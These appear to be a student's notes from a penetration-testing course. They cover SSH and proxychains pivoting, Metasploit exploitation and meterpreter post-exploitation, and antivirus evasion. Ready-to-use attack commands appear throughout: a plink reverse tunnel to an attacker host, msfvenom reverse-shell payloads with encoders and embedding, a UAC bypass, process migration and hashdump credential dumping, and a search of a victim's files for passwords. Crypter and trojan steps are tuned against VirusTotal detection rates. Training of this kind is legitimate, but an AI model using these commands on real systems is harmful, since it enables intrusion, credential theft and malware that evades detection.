vi /etc/rinetd.conf   #rinetd is the internet redirection server 

bindaddress bindport connectaddress connectport 
208.88.127.99 80     67.23.72.109      3389 


accept traffic on external interface on tcp port 80 and redirect it to our remote windows 2003 server on port 3389 

and then 

/etc/init.d/rinetd restart 

we can copy over the proxy server ip 



Very useful video pwk 111!! Watch it again!

with this technique we can keep the local network secure and use the port forwarding for connectivity between all devices!!

9.15 Fun with SSH - Tunnels and Proxies
pwk112

The SSH protocol has many hidden secrets. One of its abilities is to create encrypted tunnels within the SSH protocol wich supports bidirectional communication
channels this obscure feature of the ssh protocol has far reaching applications for both penetration testers and security administrators alike.
As the following examples will demonstrate.
Lets start with SSH local and remote port forwarding.
SSH local port forwarding invoked with -L parameter allows us to connect a local port to a remote port over an encripted shh tunnel. While useful and more 
impressive tunneling feature is the remote port forwarding abilities of SSH. 
SSH remote port forwarding allows us to tunnel a remote port to a local server. The effect of this technique are best demonstrated through the following scenario:
we have initiated a client side attack on a organisation and we've just recieved the shell (nc -lvp 443) from an internal non routable machine.
We've uploaded a plink.exe and ssh client for windows to this victim machine and noticed that the remote desktop service is listening on the server (netstat -an |find "LISTEN"). We'd like to access the remote desktop port on this internal non routable machine. We can create a reverse ssh tunnel from the victim machine to our attacking box and tunnel out the remote desktop service from the windows machine and make that port available on my attacking box. I will invoke plink
(plink -l root -pw ubersecretpassword 208.88.127.99 -R 3390:127.0.0.1:3389) with the -R parameter to specify a remote tunnel and have it connect to my attacking machine 208.88... Then traffic from local port 3389 on the windows machine will be tunneld out and made available on my attacking machine on TCP port 3390.

netstat -antp |grep LISTEN
now that the tunnel was created we could use a tool such as rdesktop 127.0.0.1:3390 to connect on outr local interface on port 3390 wich gets tunneled to the
internal non routable windows server.


9.16 SSH Dynamic Forwarding
Now comes the really interesting part. SSH dynamic port forwarding. This SSH feature allow us to set a local listening port and have a tunnel income traffic 
to any remote destination throught a SOCKS proxy. Consider the following scenratio. You have compromised a DMZ server using a web attack and have escalated yourprivilages on that server to root. This server has both got apache and ssh services exposed to the internet. We can now use ssh to create a SOCKS proxy on our attacking box on port 8080 and tunnel all incomming traffic to that port throught the DMZ network of our victim. And now by using the local socks proxy
(netstat -antp |grep 8080) is listening on port 8080. We can tunnel and redirect traffic from our attacking machine to our non routable DMZ network.
Lets see hwo this is done.

9.17 Proxy Chains pwk114
SO now that we have a local socks proxy listening on our loopback interface on port 8080 we can use a tools such as proxy chains to forward and tunnel traffic
to the non-routable DMZ network.

vi /etc/proxychains.conf 

#defaults set to "tor"
socks4 127.0.0.1 8080

and once thats set we can simply type 

proxychains nmap -p 3389 -sT -Pn 172.16.40.18-22 --open

proxychains takes this traffic and redirects it to the DMZ network

Although relatevly slow we've managed to proxify nmap and discover a rdp server on this remote machine. Once discovered we can once again remote desktop client connection and connect to this internal non routable desktop server.

proxychains rdesktop 172.16.40.20

Learning how to use the tunneling techniques demonstrated in this module will greatly improve your ability to reach otherwise non routable networks once you set foot in an organization. Use thease tools while exploaring hidden networks in the offsec labs.

10.0 The Metasploit Framework

Advanced open source platform written in ruby for developing ,testing and using exploit code. The project initially started of a portable network game and has since evlolved into a powerfull framework for penetration testing, exploit development and vulnerability research. The framework standardizes the exploit usage
sintax and provides us with dynamic shellcode capabilities. This means that for each exploit in the framework we can choose various shellcode payloads such as abindshell, reverseshell, etc. Newcommers to the metasploit framework are often overwhelmnd of the different usecases of the tools. The fact is the metasploit framework can come in handy in almost every phase of the penetration test - from passive and active information gathering to vulnerability research and development all the way to client side attacks and post exploitation techniques. With all of this functionality available its easy to see how one can get lost within the tool. Fortunately for us the msf provides a unified and sensible interface for using all of its features. There are several user interfaces that we can use to 
operate the metasploit framework. The most commonly used interface is the interactive console msf console. The framework requiers several services t obe running
That are not enabled at boot time in kali linux.

/etc/init.d/postgresql start 
/etc/init.d/metasploit start
 
msfconsole


help #to get us started

10.1 Auxiliary Modules

Provide various functionality such as protocol enumeration, host discovery and more. Thease modules all follow a common synthax usage. Which makes them easy to explore and use. Lets try and use some of the modules.

show auxiliary

Information gathering located under the gather hierarchy, scanning scanning and enumeration services located under the scanner hierarchy and so on.


10.2 SNMP Auxiliary Module 
pwk118

search snmp 

use auxiliary/scanner/snmp/snmp_enum

show options 

set THREADS 10
set RHOSTS ip 

fill in  all requierd fields with the data and 
run
exploit 

setg RHOST ip-address #set global parameter for future uses on all modules 

10.3 Metasploit Database Services 
If the metasploit and postgresql services are started ahead of time the metasploit framework will log its findings and information about 
discovered hosts in a convenient and accessable database. To display all discovered hosts to this point we can ginve the (hosts) command
hosts
to further populate this database we can use the db_nmap 192.168.31.200-254 --top-ports 20 to scan hosts with nmap and nhave the scan output inserted into the database.
Once the scan is done we can quearry the database for machines with specific properties for example we can look for all machines with port 443open

services -p 443


10.3 Metasploit Exploits

The Metasploit Framework contains hundreds on commercial grade exploits for vulnerable programs and services. Thease exploits are all envoked in much the same way as auxiliary modules are used. 

search pop3

there are ready made exploits 
we found a exploit for our dearly beloved seattle mail server

use exploit/windows/pop3/seattlelab_pass

we will continue by selecting a shellcode payload that we would like metasploit to use for this exploit.

set PAYLOAD windows/  #starting with exploits relevant to the Windows OS and then pressing the tab will list all the payloads available through the metasploit framework. We get a huge list of payload options but for now we will be using the simple windows reverse shell payload
windows_reverse_tcp so i will copy this and set a payload to this value 

set PAYLOAD windows/shell_reverse_tcp

show options

set RHOST
set LHOST

set LPORT #the listening port of the attacking machine 

exploit 

10.4 Metasploit Payloads

pwk122

Up to now we've limited our payload use in metasploit to simple standalone reverse payloads. Lets take some time to examine some aditional 
wich the metasplot framework has to offer.One of the first destinctions wich are important to make when discussing metasploit payloads are between staged and non staged shellcode. A non staged payload is a paylaod that is sent in its entierty as we've been doing up till this point.
A staged payload is usually sent in two parts. The first part is a small primary payload wich usually instructs the victim to connect back to the attacker and accept a larger secondary payload. And then executes it.

10.5 Meterpreter

One of the most powerfull staged payloads wich the metasploit framework has to offer is the meterpreter payload. Its a staged multifunction
payload that can be dinamically extended at runtime. In practise this means that meterpreter shell provides more features and functionality 
than a regular shell by having inbuild functions such as file uploads and downlaods, keyloggers and so on. This additional functionality 
makes meterpreter the favourite and most commonly used payload in the metasplot framework. Lets get a taste of it by swapping out the current non staged reverse shell with revserse meterpreter connection in our slmail exploit.

set PAYLOAD windows/met #pressing tab to view the options

set PAYLOAD windows/meterpreter/reverse_tcp
show options
exploit

when we have a meterpreter shell 
help command will show the options 

sysinfo #querries the machine for basic parameters
getuid 
search -f *pass*.txt # we can search the victims machine for any files we like 

10.6 Meterpreter in Action 

Meterpreter simplifies most of the post exploitation processes such as uploading and downloading files. Let try to upload netcat to the victim machine.

upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec

In much the same manner we can also downlaod files from the victim's machine

downlaod c:\\Windows\\system32\\calc.exe /tmp/calc.exe

TO directly interact with the victim's machine command prompt we can simply type 

shell

The huge advantage of spawinng a command shell from meterpreter is that if for some reason our shell shoul die we can simply spawn a new one from within the meterpreter session 

shell

10.7 Additional Payloads

Metasploit offer a huge variaty of shellcode payloads. Getting to know those payloads could help us significantly during a penetration test.
For example the reverse meterpreter https payload is desighned to encapsulate enterpreter communications whitin https requests. Allowing us to buypass most deep packet inspection filters. Another nice example is the reverse tcp all ports payload, which attempts to connect back to our attacking machine on all ports which is usefull in situations where we are not sure what firewall rules are in palc.

10.8 Binary Payloads
pwk126

Metasploit not only has a wide range of available payloads but can also output those various payloads into different file types and formats.
Such as ASP, VBscript, java executables, windows dll's and pe binaries etc.
Lets take a closer look at the msf payload utility and generate a windows reverse meterpreter pe executable.

msfpayload #not aivalable in kali kali??

msfpayload windows/meterpreter/reverse_https O #O shows additional options 

10.8 The Multihandler Module

The Metasploit Multihandler module can accept various payloads and handle them correctly including single and multistage payloads.

use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_https

show options 

set LHOST
set LPORT
exploit


now we can go to the windows machine and execute the revers_met_http.exe

and we have a revsere meterpreter https session!

10.9 Porting Exploits to MSF

Lets take a look at what it takes to port some of our own exploits to the metasploit framework. I will use a python exploit 

cat vuln-server-exploit.py

pwk128

Even if you have no programming or ruby experience dont be intimidated by this exercise. The ruby language and exploit structure are simple t ofollow and understand. I will start by verifying that my python script works.

i will make the needed metasploit framework directory structure under the root directory so we dont corrupt the the metasploit kali package:

mkdir -p ~/.msf4/modules/exploits/windows/windows/misc

and enter that dir 

i will now copy over an existing slmail metasploit exploit  which i will use as a template to this current directory

cp /usr/share/metasploit-framework/modules/exploits/pop3/seattlelab_pass.rb ./vulnserver.rb

and edit it 

vi vulnserver.rb

We change the name description and author of the exploit er update the space needed for our shellcode and edit the return address to match the one in our python code. Update the target description.CHange the default port. We will recreate the exploit buffer within this ruby exploit by copying it from the python script.

then search for our own exploit 

search vulnserv
use
set PAYLOAD
set LHOST
set LPORT
set RHOST

10.10 Post Exploitation with Metasploit

Now that we have a reverse meterpreter shell. Lets take a deeper look at the Metasploit post exploitation options. So far we've seen meterpreter payload features file uploads and downloads. And simple process and session management. However the framework has a lot more to offer in this field. From privilage escalation functions, dumping windows hashes, running keyloggers and even taking screenshots of the victim's machine.
But before start playing with those post exploitation modules its crusial that we have full understanding with the current privilages we have on the system.Especially when working with Windows OS. Lets Use the meterpreter shell as an example.
The shell that i recieved came from a process of the offsec user. This user is part of the administrative group on the windows 7 mashine. Although this user is in the administrative group we still might have to face restrictions.

getuid 

getprivs

shows that our shell has uac restrictions imposed in it.This means that if we try to run a post exploitation module such as hasshdump

hashdump

the process will fail because we dont have enought privileges. In this case first we need to bypass uac.I can do this by backgrounding the current session

background

and invoking metasploit post exploitation module able to bypass uac. 

use exploit/windows/local/bypassuac
show options 

In this case we need to apply this post exploitation module to the session parameter which corresponds to the meterpreter session number.

sessions -l

in this case its the first session

set SESSION 1

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST
set LPORT
run

The module runs and proceeds to upload a file to our target machine which bypasses uac and executes a nwq reverse connection with a no uac restricted administrative shell. We confirms this by using 

getprivs 

which now reveals a much larger set of privileges.
So now that we have a nont uac restricted shell, lets try running the hashdumb modules once again.

hashdump

unfortunately it fails once again! This module needs to run with system privileges under the context of existing process while right now 

getuid

we are running with no uac restricted administrative privileges. To solve this problem we can try migrating the current meterpreter process to an existing process running with system privileges. Sush as snmp service

ps 


migrate 1356 #1356 is the process id 

getuid 

Now we have system privileges.

hashdump

excellent! SO we've successefully managed to run a post exploitation module which requierd system privileges and managed to navigate our way through the issues that i may commonly face in similar situations. Understanding and managing my permissions correctly will save a lot of time and frustration in those high pressure moments when you get a reverse shell. The last thing you want to dois thumble around with the shell and then loose it due to mismanagement.

background 

sessions -l #listing all sessions we currently have 

10.11 Antivirus Software Avoidance 

Antivirus systems mostly employ blacklist technologies where by the known signatures of malware are searched for in files of the file system and then quarrantied if found. The process of bypassing the antivirus software involves changing or encripting the contents of a non malicious file so as to change its binary structure.By doing so the known signature for the malicious file is no longer relevant and the new file structure may fool the antivirus software into ignoring this file. Depending on the type and quality of the antivirus software being tested sometimes the antivirus bypass can be achieved by simply changing a couple of harmless strings inside the binary file from uppercase to lowercase. As different antivirus software use different signatures and technologies to detect malware 
its usually hard to come out with a universal solution for antivirus avoidance and quiet often the process is based on trial and error in a test enviorment.
We have several tools available to us in kali linux that can help us get passed the antivirus software. Let explore them and test their effectivnes agains a variety of antivirus software vendours. 
Lets create a standard reverse shell payload 

msfpayload windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=4444 X > ~/Desktop/shell_reverse.exe

note msfpayload in my version in kali is now msfvenom!

Lets go ahead and submit this executable to virus total 

www.virustotal.com 

33/48 antivirus enginesdetect this as a thread

in my msfvenom generated file 53/71 engies identified it as a thread.

now lets try to encode our payload using msfencode ... in my case msfvenom again should do the job.

i ran

msfvenom -p  windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f exe -a x86 -e x86/shikata_ga_nai -c 9 -o  ~/Desktop/shell_reverse.exe --platform windows
  
and test the encoded file with the virus total again and surprisingly the encoding did worse actually with 56/71

Lets try to improve on this...

msfvenom -p  windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=4444 -f exe -a x86 -e x86/shikata_ga_nai -x /usr/share/windows-binaries/plink.exe -o  ~/Desktop/shell_reverse_msf_encoded_embedded.exe --platform windows

now we have lowered our detection rate to 39/70


Lets see if we can improve on this detection rate even more.

10.12 Packers and Crypters
Software protection tools and executable crypters are most commonly used to opfuscate and license binaries by software vendors to prevent revserse engineering atempts by software pirates. One good open source crypter is called hyperia and its present in kali linux. Lets see what effect this crypter has on the detection rate.  I will copy our best perfromer payload and call it backdoor.exe

cp ~/Desktop/shell_reverse_msf_encoded_embedded.exe backdoor.exe

i will then copy hiperion from the windows binaries directory 


cp /usr/share/windows-resources/hyperion/hyperion.zip .

then extract and crosscompiled shown in pwk131
   
not available in my kali linux!

Looks like hyperiom has improved out evasion rate 16/48 antivirus engines tested have found it. So this is a big improvement.

10.13 Private Custom Tools 

Even more effective way to improve the detection of our payload is to use tools and binaries that are unknown to antivirus vendors. Either by rwiting our own or simply by using non mainstream code. For example a isoteric code written in c found in the internet.. its probably not commonly used.
I will cross compile this code in kali and check the result in virustotal. Nice its 1/47. Lets go even further and rwite our own python trojan.

cat bind.trojan.py
pwk132

2/47 result.... still bypassing most of the commercial antivirus products 

To summerise anti virus detection is a dynamic field and in a few months more vendors might detect the code, however the principals of antivirus detection 
rearly change.

11.0 Putting it all together - Simulated Pentetration Test
The following module describes a fectitious penetration test performed on the megacorpone domain. The purpose of this module is to provide context for the technical methods and techniques covered in this course. FIctitious we have operated different scenarious we might encounter during a penetration tests into this example. Please do not try to replicate thease attacks. As they will not work for you. I am using controlled enviorment for this demonstration that is not publicly available to you.


  


